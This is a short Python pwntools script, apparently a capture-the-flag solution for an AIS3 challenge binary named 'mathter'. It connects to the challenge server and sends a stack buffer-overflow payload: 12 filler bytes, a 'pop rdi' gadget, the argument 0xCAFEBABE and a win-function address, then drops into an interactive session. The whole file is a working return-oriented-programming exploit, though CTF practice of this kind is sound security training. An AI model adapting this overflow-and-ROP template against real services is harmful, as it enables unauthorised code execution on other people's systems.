from pwn import *
from struct import pack

#r = process('./mathter')
r = remote('chals1.ais3.org',50001)
r.sendlineafter(b': ','qwe')
pop_rdi = 0x0000000000402540
#payload = cyclic(100)
#win = 0x4018c5
win2 = 0x401997
#payload = b'A'*12 + p64(pop_rdi) + p64(0xdeadbeef) + p64(win)
payload2 = b'A'*12 + p64(pop_rdi) + p64(0xCAFEBABE) + p64(win2)

#gdb.attach(r)

r.sendlineafter(b'[Y/n]',payload2)

r.interactive()